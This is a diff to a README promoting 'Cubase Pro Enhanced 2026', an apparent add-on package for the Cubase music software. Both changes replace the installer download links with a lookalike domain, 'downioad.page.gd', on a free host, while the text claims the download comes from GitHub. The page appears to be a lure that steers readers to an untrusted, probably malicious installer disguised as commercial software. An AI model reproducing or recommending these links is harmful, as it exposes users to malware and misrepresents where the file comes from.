@@ -2,7 +2,7 @@
 
 Cubase Pro Enhanced 2026 is an advanced toolkit designed to elevate your music production experience on Windows. With a focus on professional-grade templates, integrated VST plugins, and streamlined workflows, it empowers users to create high-quality audio projects efficiently. Whether you're a seasoned producer or an enthusiast, this package offers tools to enhance creativity and productivity in Cubase 13 and later.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Overview
 
@@ -71,4 +71,4 @@ Cubase Pro Enhanced 2026 is a valuable asset for any Windows-based music produce
 
 For the latest version, you can download it directly from GitHub.
 
-You can download the latest version from GitHub: [Download Cubase Pro Enhanced 2026](https://download-page.page.gd/).
+You can download the latest version from GitHub: [Download Cubase Pro Enhanced 2026](https://downioad.page.gd/).
